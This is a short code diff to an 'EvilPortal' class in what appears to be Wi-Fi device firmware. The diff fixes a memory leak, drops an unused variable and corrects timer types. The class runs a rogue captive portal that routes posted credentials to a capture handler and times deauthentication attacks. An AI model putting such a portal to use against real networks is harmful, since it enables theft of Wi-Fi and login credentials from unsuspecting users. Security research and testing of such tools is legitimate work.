@@ -31,10 +31,12 @@ EvilPortal::EvilPortal(
     if (!_backgroundMode) { loop(); }
 }
 
-EvilPortal::~EvilPortal() {}
+EvilPortal::~EvilPortal() {
+    delete _captiveHandler;
+    _captiveHandler = nullptr;
+}
 
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
-    AsyncResponseStream *response = request->beginResponseStream("text/html");
     String url = request->url();
     if (url == "/") _portal->portalController(request);
     else if (url == "/post") _portal->credsController(request);
@@ -138,7 +140,7 @@ void EvilPortal::beginAP() {
     }
     wifiConnected = true;
 
-    int tmp = millis();
+    unsigned long tmp = millis();
     while (millis() - tmp < 3000) yield();
 
     setupRoutes();
@@ -272,6 +274,7 @@ void EvilPortal::restartWiFi(bool reset) {
     dnsServer->stop();
     vTaskDelay(100 / portTICK_PERIOD_MS);
 
+    delete _captiveHandler;
     _captiveHandler = nullptr;
 
     wifiDisconnect();
@@ -290,7 +293,7 @@ void EvilPortal::resetCapturedCredentials(void) { previousTotalCapturedCredentia
 void EvilPortal::loop() {
     if (_backgroundMode) return;
 
-    int lastDeauthTime = millis();
+    unsigned long lastDeauthTime = millis();
     bool shouldRedraw = true;
     bool exitPortal = false;
 
